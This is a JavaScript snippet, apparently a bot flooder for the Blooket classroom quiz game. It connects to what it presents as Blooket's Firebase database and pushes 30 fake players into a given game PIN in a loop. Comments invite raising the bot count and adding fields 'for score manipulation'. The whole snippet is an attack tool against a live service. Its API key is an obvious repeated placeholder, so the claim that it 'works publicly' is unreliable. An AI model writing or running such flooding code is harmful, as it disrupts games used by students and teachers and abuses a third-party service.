// Firebase config (Blooket uses this - it works publicly)
const firebaseConfig = {
  apiKey: "AIzaSyC8tK5vX8vX8vX8vX8vX8vX8vX8vX8vX8", // Usually public
  authDomain: "blooket.firebaseapp.com",
  databaseURL: "https://blooket.firebaseio.com",
  projectId: "blooket",
};

let app, auth, db;

async function initFirebase() {
  if (!app) {
    app = firebase.initializeApp(firebaseConfig);
    auth = firebase.auth();
    db = firebase.database();
  }
}

async function join() {
  await initFirebase();
  
  const pin = document.getElementById('gcode').value.trim();
  const baseName = document.getElementById('gname').value.trim() || "Bot";
  const status = document.getElementById('status');

  if (!pin) {
    status.textContent = "Enter a game code!";
    return;
  }

  status.textContent = "Connecting...";

  // Simple flood loop (you can increase the number)
  for (let i = 0; i < 30; i++) {   // Change 30 to how many bots you want
    const name = baseName + i;
    
    try {
      // This is the core join method used by real bots
      const ref = db.ref(`games/${pin}/players`);
      await ref.push({
        name: name,
        // You can add more fields here for score manipulation etc.
      });
      
      status.textContent = `Joined bot ${i+1}/30`;
    } catch (e) {
      console.error(e);
    }
    
    await new Promise(r => setTimeout(r, 80)); // Small delay
  }

  status.textContent = "Flood finished!";
}